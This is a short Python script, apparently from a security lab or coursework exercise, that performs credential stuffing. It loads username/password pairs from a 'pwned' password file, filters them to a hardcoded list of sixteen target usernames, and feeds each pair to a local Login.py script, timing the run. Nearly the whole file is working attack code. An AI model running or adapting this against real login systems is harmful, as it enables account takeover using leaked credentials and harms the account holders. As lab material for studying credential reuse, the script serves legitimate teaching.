import subprocess
import re
import time

def username_password_tuple():
    lines = []
    with open("PwnedPWfile.txt", 'r', encoding="utf-8") as file:
        for line in file:
            if '\n' in line:
                stripped_line = re.sub('\n', "", line)
                spaced_line = re.sub(',', " ", stripped_line)
                if " " in spaced_line:
                    line_split = spaced_line.split()
                    lines.append((line_split[0], line_split[1]))              
    return lines

def break_func(username, password):
    arguments = ['python', 'Login.py', username, password]
    process = subprocess.run(arguments)

if __name__ == "__main__":
    remaining_members = [
    "ForestGreenWolf607",
    "SkyBlueBear611",
    "ForestPurpleFalcon522",
    "OceanPurpleShark246",
    "OceanGreenBear963",
    "MountainPurpleShark585",
    "StarRedWolf267",
    "SkySilverWolf337",
    "MountainYellowShark708",
    "StarGreenBear981",
    "SkySilverWolf162",
    "StarSilverBear427",
    "MountainBlueFalcon157",
    "ForestGreenShark821",
    "StarRedEagle761",
    "RiverOrangeTiger809"
]
    user_pass_combo = username_password_tuple()
    user_pass_combo = [combo for combo in user_pass_combo if combo[0] in remaining_members]
    print(user_pass_combo)
    time_start = time.time()
    for user in range(len(user_pass_combo)):
        break_func(user_pass_combo[user][0], user_pass_combo[user][1])
    time_end = time.time()
    total_time = time_end - time_start
    with open('username_password.txt', 'r') as file:
        for line in file:
            print(line)
    print(f'Total time: {total_time}s')         
